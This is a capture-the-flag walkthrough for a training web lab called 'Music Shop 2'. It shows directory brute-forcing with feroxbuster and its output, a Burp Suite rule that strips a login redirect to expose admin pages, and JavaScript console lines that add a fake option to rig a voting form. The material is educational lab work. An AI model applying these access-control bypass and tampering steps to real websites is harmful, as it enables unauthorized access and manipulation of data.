# Challenge #3 - Music Shop 2

## Credentials

Username: Mario
Password: pass123

## Objectives

- You are called to uncover any other potential vector an attacker could use to alter the music chart.
- Demonstrate you can fake the voting system by defeating Justin Bieber

## Hints

- Recommended tools
  - Burps suite
  - Web Browser
- Missing Function Level Access Control 

## What you will learn

- How to inspect web applications for security misconfigurations
- How to test website redirects
- How to use Burp Suite Match and replace feature

## Steps

You need to discover there can be that "Missing Function Level Access Control". Send the command below to start feroxbuster brute force on the target.

```
feroxbuster -u http://2.challenge.auth.site -w /usr/share/seclists/Discovery/Web-Content/big.txt -x php -C 403

 ___  ___  __   __     __      __         __   ___
|__  |__  |__) |__) | /  `    /  \ \_/ | |  \ |__
|    |___ |  \ |  \ | \__,    \__/ / \ | |__/ |___
by Ben "epi" Risher 🤓                 ver: 2.3.3
───────────────────────────┬──────────────────────
 🎯  Target Url            │ http://2.challenge.auth.site
 🚀  Threads               │ 50
 📖  Wordlist              │ /usr/share/seclists/Discovery/Web-Content/big.txt
 👌  Status Codes          │ [200, 204, 301, 302, 307, 308, 401, 403, 405, 500]
 💢  Status Code Filters   │ [403]
 💥  Timeout (secs)        │ 7
 🦡  User-Agent            │ feroxbuster/2.3.3
 💉  Config File           │ /etc/feroxbuster/ferox-config.toml
 💲  Extensions            │ [php]
 🔃  Recursion Depth       │ 4
───────────────────────────┴──────────────────────
 🏁  Press [ENTER] to use the Scan Cancel Menu™
──────────────────────────────────────────────────
301        9l       28w      330c http://2.challenge.auth.site/admin
200        0l        0w        0c http://2.challenge.auth.site/config.php
301        9l       28w      331c http://2.challenge.auth.site/images
200      146l      255w     3616c http://2.challenge.auth.site/index.php
200       55l      104w     1367c http://2.challenge.auth.site/login.php
302        1l        3w       52c http://2.challenge.auth.site/logout.php
302       74l      118w     1679c http://2.challenge.auth.site/admin/index.php
200       59l      100w     1380c http://2.challenge.auth.site/admin/login.php
301        9l       28w      337c http://2.challenge.auth.site/images/bands
200       47l      182w     9184c http://2.challenge.auth.site/images/bands/1
200       60l      332w    16566c http://2.challenge.auth.site/images/bands/10
200       47l      242w    12356c http://2.challenge.auth.site/images/bands/2
200      429l      969w    59501c http://2.challenge.auth.site/images/bands/3
200       29l      181w     8748c http://2.challenge.auth.site/images/bands/4
200       56l      365w    19933c http://2.challenge.auth.site/images/bands/5
200      197l     1135w    60486c http://2.challenge.auth.site/images/bands/7
200      674l     3578w   114572c http://2.challenge.auth.site/images/bands/6
200      100l      604w    27185c http://2.challenge.auth.site/images/bands/9
200      895l     4226w   192121c http://2.challenge.auth.site/images/bands/8
200      232l      482w     3650c http://2.challenge.auth.site/style
302        0l        0w        0c http://2.challenge.auth.site/vote.php
200      201l     1517w    80366c http://2.challenge.auth.site/images/header
200       64l      453w    16562c http://2.challenge.auth.site/images/logo
[####################] - 2m    163800/163800  0s      found:23      errors:85     
[####################] - 1m     40950/40950   485/s   http://2.challenge.auth.site
[####################] - 1m     40950/40950   509/s   http://2.challenge.auth.site/admin
[####################] - 1m     40950/40950   490/s   http://2.challenge.auth.site/images
[####################] - 1m     40950/40950   507/s   http://2.challenge.auth.site/images/bands
```

With burp suite turned on open the admin page on the browser.

```
http://2.challenge.auth.site/admin/index.php
```

You will be redirect to the admin login page. Look on burp history. You will notice that the index.php has one header location and also all the administrative content.

In burp suite go to proxy options, them to match and replace settings. Click in add and fill the as follow.

```
Type: Response header
Match: Location: login.php
Replace: Leave empty
Regex match: Unchecked
```

This will replace the header "Location: login.php" in any reponse to nothing. Make sure that the rule is enabled.

On the browser open the admin page one more time.

```
http://2.challenge.auth.site/admin/index.php
```

This time the page will open without redirecto to login.

Open the browser javascript console and send the commands below. Line by line, to create one band option to vote.

```
x = document.forms[0].band_id;
option = document.createElement("option")
option.text = '10';
x.add(option);
```

Now fill the votes number and send submit the form.
